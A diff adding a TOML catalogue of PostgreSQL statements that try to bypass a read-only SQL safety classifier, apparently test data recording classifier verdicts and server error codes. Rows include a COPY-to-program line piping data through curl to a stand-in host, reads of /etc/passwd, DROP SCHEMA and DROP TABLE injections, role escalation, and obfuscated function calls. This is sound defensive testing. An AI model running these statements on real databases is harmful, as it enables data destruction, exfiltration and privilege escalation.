@@ -1,0 +1,1277 @@
+# SQL-SAFE-06 bypass catalogue, PostgreSQL (M3b Task 18; `alg/13` SQL-SAFE-06). Data, read by
+# path: run A (`sql-safety/tests/bypass_run_a.rs`, classifier on, offline), run A′
+# (`hacivat-exec/tests/docker_m3b_bypass.rs`, the real pool on Docker) and run B
+# (`hacivat-session/tests/docker_m2b_bypass.rs`, no classifier on Docker).
+#
+# Each row:
+# - `id`: the catalogue row (P/M/L/X, `SAFE02-n` for the SQL-SAFE-02 test table, `n-3` and
+#   `M7/I-2` for run B's review rows);
+# - `sql`: the statement; `{victim}` (another backend's ID), `{tro}` (the engine's transaction
+#   read-only variable) and `{d}` (a scratch directory) are filled in where it runs;
+# - `classifier`: run A's verdict under `ReadOnlyPlusExplain` for a human and the report's
+#   reason codes (sorted, unique), with the session's lexing modes known (the dialect's
+#   defaults unless `modes` names others; `modes = "unknown"`: not known);
+# - `server_off`: run B's outcomes that count as stopped with no classifier (a server code, `1a`,
+#   `protocol`, `function`, `gap`, `refused`); empty for a neutralised row (it may run, and
+#   must leave nothing);
+# - `accounts`: who runs it in Docker (`hv_ro`, `owner` = the test account); empty: run A only;
+# - `kind`: `server_blocked | neutralised | privilege_only | non_transactional`;
+# - `anchor`: where the row comes from;
+# - optional `search_path`, `allowlist` (the profile's function allowlist), `note`, and on
+#   MariaDB `observed`: run B's recorded outcome per account (C19, R-M3-58).
+
+[[row]]
+id = "P1"
+sql = "WITH d AS (DELETE FROM hv_t23 RETURNING *) SELECT * FROM d"
+classifier = { verdict = "deny", reasons = ["DataModifyingCte", "Destructive", "WriteData"] }
+server_off = ["25006"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P2"
+sql = "SELECT * INTO hv_t23_p2 FROM hv_t23"
+classifier = { verdict = "deny", reasons = ["SchemaChange", "WriteData"] }
+server_off = ["25006"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P3"
+sql = "EXPLAIN (ANALYZE) DELETE FROM hv_t23"
+classifier = { verdict = "deny", reasons = ["Destructive", "WriteData"] }
+server_off = ["25006"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P4"
+sql = "SELECT 1; DROP TABLE hv_t23"
+classifier = { verdict = "deny", reasons = ["MultiStatement"] }
+server_off = ["42601"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P4"
+sql = "COMMIT; DROP TABLE hv_t23"
+classifier = { verdict = "deny", reasons = ["MultiStatement"] }
+server_off = ["1a"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P5"
+sql = "SET TRANSACTION READ WRITE"
+classifier = { verdict = "deny", reasons = ["SessionState", "SetNotAllowlisted"] }
+server_off = ["25001"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P5"
+sql = "SET transaction_read_only = off"
+classifier = { verdict = "deny", reasons = ["SessionState", "SetNotAllowlisted"] }
+server_off = ["25001"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P5"
+sql = "SELECT set_config('transaction_read_only', 'off', true)"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted", "SessionState"] }
+server_off = ["25001"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P7"
+sql = "COMMIT"
+classifier = { verdict = "deny", reasons = ["TxnControl"] }
+server_off = ["1a"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P7"
+sql = "COMMIT AND CHAIN"
+classifier = { verdict = "deny", reasons = ["TxnControl"] }
+server_off = ["1a"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P7"
+sql = "/* x */ END"
+classifier = { verdict = "deny", reasons = ["TxnControl"] }
+server_off = ["1a"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P7"
+sql = "ROLLBACK"
+classifier = { verdict = "deny", reasons = ["TxnControl"] }
+server_off = ["1a"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P8"
+sql = "CALL hv_t23_commit()"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = ["2D000"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P9"
+sql = "DO $$ BEGIN INSERT INTO hv_t23 VALUES (9); END $$"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = ["25006"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P14"
+sql = "COPY hv_t23 FROM '/etc/hostname'"
+classifier = { verdict = "deny", reasons = ["ExternalFile", "ExternalIo", "WriteData"] }
+server_off = ["25006", "42501"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P26"
+sql = "CREATE TEMP TABLE hv_t23_tmp (a int)"
+classifier = { verdict = "deny", reasons = ["SchemaChange"] }
+server_off = ["25006", "42501"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P37"
+sql = "SELECT nextval('hv_t23_seq')"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "SequenceAdvance"] }
+server_off = ["25006", "42501"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P37"
+sql = "SELECT setval('hv_t23_seq', 100)"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "SequenceAdvance"] }
+server_off = ["25006", "42501"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P38"
+sql = "SELECT hv_t23_sd_write()"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown"] }
+server_off = ["25006"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P38"
+sql = "SELECT hv_t23_dyn_write()"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown"] }
+server_off = ["25006"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P38"
+sql = "SELECT query_to_xml('DELETE FROM hv_t23 RETURNING a', true, true, '')"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "FnDenylisted"] }
+server_off = ["25006", "0A000"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P38"
+sql = "SELECT lo_from_bytea(0, '\\x6876')"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "WriteData"] }
+server_off = ["25006", "gap"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P38"
+sql = "SELECT lo_create(0)"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "WriteData"] }
+server_off = ["25006", "gap"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P38"
+sql = "SELECT lo_put(230023, 0, '\\x00')"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "WriteData"] }
+server_off = ["25006", "42501", "gap"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P38"
+sql = "SELECT lo_unlink(230023)"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "WriteData"] }
+server_off = ["25006", "42501", "gap"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P38"
+sql = "SELECT lo_import('/etc/hostname')"
+classifier = { verdict = "deny", reasons = ["ExternalFile", "ExternalIo", "FnDenylisted"] }
+server_off = ["25006", "42501", "gap"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P35"
+sql = "SELECT txid_current()"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "XidConsume"] }
+server_off = ["gap"]
+accounts = ["hv_ro", "owner"]
+kind = "server_blocked"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-blocked"
+
+[[row]]
+id = "P5"
+sql = "RESET transaction_read_only"
+classifier = { verdict = "deny", reasons = ["SessionState", "SetNotAllowlisted"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P6"
+sql = "SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE"
+classifier = { verdict = "deny", reasons = ["SessionState", "SetNotAllowlisted"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P6"
+sql = "SET default_transaction_read_only = off"
+classifier = { verdict = "deny", reasons = ["SessionState", "SetNotAllowlisted"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P6"
+sql = "RESET ALL"
+classifier = { verdict = "deny", reasons = ["LexModeChange", "PrivilegeChange", "PrivilegeGrant", "SessionState"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P10"
+sql = "PREPARE hv_t23_s AS SELECT 1"
+classifier = { verdict = "deny", reasons = ["PreparedStatement"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P15"
+sql = "SELECT pg_advisory_lock(230023)"
+classifier = { verdict = "deny", reasons = ["AdvisoryLock", "FnDenylisted"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P15"
+sql = "LOCK TABLE hv_t23 IN ACCESS EXCLUSIVE MODE"
+classifier = { verdict = "deny", reasons = ["TableLock"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P17"
+sql = "SET search_path = pg_catalog"
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P23"
+sql = "SET standard_conforming_strings = off"
+classifier = { verdict = "deny", reasons = ["LexModeChange", "SessionState", "SetNotAllowlisted"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P25"
+sql = "NOTIFY hv_t23, 'x'"
+classifier = { verdict = "deny", reasons = ["Notify"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P25"
+sql = "SELECT pg_notify('hv_t23', 'x')"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P26"
+sql = "LISTEN hv_t23"
+classifier = { verdict = "deny", reasons = ["SessionState"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P26"
+sql = "DECLARE hv_t23_c CURSOR WITH HOLD FOR SELECT 1"
+classifier = { verdict = "deny", reasons = ["SessionState"] }
+server_off = []
+accounts = ["hv_ro"]
+kind = "neutralised"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes, #pg-discard"
+
+[[row]]
+id = "P32"
+sql = "SELECT pg_logical_emit_message(false, 'hv_t23', 'x')"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "non_transactional"
+anchor = "docker_m2b_bypass (run B), Task 23 finding F1 (PUBLIC EXECUTE)"
+
+[[row]]
+id = "P32"
+sql = "SELECT pg_catalog.pg_logical_emit_message(false, 'hv_t23', 'x'::bytea)"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "non_transactional"
+anchor = "docker_m2b_bypass (run B), Task 23 finding F1 (PUBLIC EXECUTE)"
+
+[[row]]
+id = "P32"
+sql = "SELECT \"pg_catalog\".\"pg_logical_emit_message\"(false, 'hv_t23', 'x')"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "non_transactional"
+anchor = "docker_m2b_bypass (run B), Task 23 finding F1 (PUBLIC EXECUTE)"
+
+[[row]]
+id = "P32"
+sql = "SELECT PG_LOGICAL_EMIT_MESSAGE /* c */ (false, 'hv_t23', 'x')"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "non_transactional"
+anchor = "docker_m2b_bypass (run B), Task 23 finding F1 (PUBLIC EXECUTE)"
+
+[[row]]
+id = "P32"
+sql = "SELECT U&\"pg\\005flogical_emit_message\"(false, 'hv_t23', 'x')"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "non_transactional"
+anchor = "docker_m2b_bypass (run B), Task 23 finding F1 (PUBLIC EXECUTE)"
+
+[[row]]
+id = "P32"
+sql = "DO $$ BEGIN PERFORM pg_logical_emit_message(false, 'hv_t23', 'x'); END $$"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "non_transactional"
+anchor = "docker_m2b_bypass (run B), Task 23 finding F1 (PUBLIC EXECUTE)"
+
+[[row]]
+id = "P32"
+sql = "SELECT pg_logical_emit_message(true, 'hv_t23', 'x')"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "non_transactional"
+anchor = "docker_m2b_bypass (run B), Task 23 finding F1 (PUBLIC EXECUTE)"
+
+[[row]]
+id = "P11"
+sql = "SELECT pg_terminate_backend({victim})"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P13"
+sql = "COPY (SELECT 1) TO PROGRAM 'true'"
+classifier = { verdict = "deny", reasons = ["ProcessExec"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P14"
+sql = "SELECT pg_read_file('/etc/hostname')"
+classifier = { verdict = "deny", reasons = ["ExternalFile", "ExternalIo", "FnDenylisted"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P14"
+sql = "COPY hv_t23 TO '/tmp/hv_t23_copy'"
+classifier = { verdict = "deny", reasons = ["ExternalFile", "ExternalIo"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P16"
+sql = "SET ROLE hv_test"
+classifier = { verdict = "deny", reasons = ["PrivilegeChange", "PrivilegeGrant", "SessionState", "SetNotAllowlisted"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P16"
+sql = "SET SESSION AUTHORIZATION hv_test"
+classifier = { verdict = "deny", reasons = ["PrivilegeChange", "PrivilegeGrant", "SessionState", "SetNotAllowlisted"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P31"
+sql = "SELECT pg_create_physical_replication_slot('hv_t23_slot')"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P31"
+sql = "DO $$ BEGIN EXECUTE 'SELECT pg_create_physical_' || 'replication_slot(''hv_t23_slot'')'; END $$"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P32"
+sql = "SELECT pg_switch_wal()"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P32"
+sql = "DO $$ BEGIN EXECUTE 'SELECT pg_switch' || '_wal()'; END $$"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P32"
+sql = "SELECT pg_logical_emit_message(true, 'hv_t23', 'x')"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P32"
+sql = "SELECT pg_logical_emit_message(false, 'hv_t23', 'x')"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["function"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P32"
+sql = "DO $$ BEGIN EXECUTE 'SELECT pg_logical_' || 'emit_message(true, ''hv_t23'', ''x'')'; END $$"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P32"
+sql = "DO $$ BEGIN EXECUTE 'SELECT pg_logical_' || 'emit_message(false, ''hv_t23'', ''x'')'; END $$"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P33"
+sql = "SELECT lo_export(230023, '/tmp/hv_t23_lo')"
+classifier = { verdict = "deny", reasons = ["ExternalFile", "ExternalIo", "FnDenylisted"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P34"
+sql = "CHECKPOINT"
+classifier = { verdict = "deny", reasons = ["AdminControl"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P34"
+sql = "SELECT pg_stat_reset()"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = ["42501"]
+accounts = ["hv_ro"]
+kind = "privilege_only"
+anchor = "docker_m2b_bypass (run B), Docker #pg-ro-escapes"
+
+[[row]]
+id = "P1"
+sql = "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d"
+classifier = { verdict = "deny", reasons = ["DataModifyingCte", "Destructive", "WriteData"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P4"
+sql = "COMMIT; DROP SCHEMA public CASCADE;"
+classifier = { verdict = "deny", reasons = ["MultiStatement"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P5"
+sql = "SELECT set_config('transaction_read_only','off',true)"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted", "SessionState"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P8"
+sql = "CALL p()"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P9"
+sql = "DO $$ BEGIN NULL; END $$"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P10"
+sql = "EXECUTE hv_t23_s"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown"] }
+server_off = []
+accounts = []
+kind = "neutralised"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P11"
+sql = "SELECT pg_terminate_backend(pid) FROM pg_stat_activity"
+classifier = { verdict = "deny", reasons = ["AdminControl", "EffectsUnknown", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P12"
+sql = "SELECT dblink_exec('dbname=x', 'DROP TABLE t')"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "ExternalIo", "ExternalNetwork", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P13"
+sql = "COPY t TO PROGRAM 'curl -d @- http://example.invalid'"
+classifier = { verdict = "deny", reasons = ["ProcessExec"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P14"
+sql = "SELECT pg_read_file('/etc/passwd')"
+classifier = { verdict = "deny", reasons = ["ExternalFile", "ExternalIo", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P15"
+sql = "SELECT * FROM t FOR UPDATE"
+classifier = { verdict = "deny", reasons = ["LockingClause"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P16"
+sql = "SET ROLE admin"
+classifier = { verdict = "deny", reasons = ["PrivilegeChange", "PrivilegeGrant", "SessionState", "SetNotAllowlisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P17"
+sql = "SET search_path = evil, pg_catalog"
+classifier = { verdict = "deny", reasons = ["SessionState", "SetNotAllowlisted"] }
+server_off = []
+accounts = []
+kind = "neutralised"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P18"
+sql = "SELECT lower('A')"
+search_path = ["evil", "pg_catalog"]
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown"] }
+server_off = []
+accounts = []
+kind = "neutralised"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P18"
+sql = "SELECT lower('A')"
+search_path = ["pg_catalog", "public"]
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = []
+kind = "neutralised"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P19"
+sql = "SELECT 1 ### 2"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "OperatorUnknown"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P20"
+sql = "SELECT * FROM hv_t23_v"
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P21"
+sql = "EXPLAIN SELECT evil_immutable()"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P22"
+sql = "COMMIT PREPARED 'gid'"
+classifier = { verdict = "deny", reasons = ["AdminControl", "TxnControl", "WriteData"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P23"
+sql = "SELECT '\\'; DROP TABLE t; --'"
+classifier = { verdict = "deny", reasons = ["MultiStatement"] }
+server_off = []
+accounts = []
+kind = "neutralised"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P23"
+sql = "SELECT '\\'; DROP TABLE t; --'"
+modes = "unknown"
+classifier = { verdict = "deny", reasons = ["MultiStatement"] }
+server_off = []
+accounts = []
+kind = "neutralised"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P24"
+sql = "SET client_encoding = 'SJIS'"
+classifier = { verdict = "deny", reasons = ["LexModeChange", "SessionState", "SetNotAllowlisted"] }
+server_off = []
+accounts = []
+kind = "neutralised"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P25"
+sql = "NOTIFY ch, 'x'"
+classifier = { verdict = "deny", reasons = ["Notify"] }
+server_off = []
+accounts = []
+kind = "neutralised"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P26"
+sql = "DECLARE c CURSOR WITH HOLD FOR SELECT 1"
+classifier = { verdict = "deny", reasons = ["SessionState"] }
+server_off = []
+accounts = []
+kind = "neutralised"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P27"
+sql = "SELECT * FROM t"
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P28"
+sql = "SELECT * FROM pg_logical_slot_get_changes('s', NULL, NULL)"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
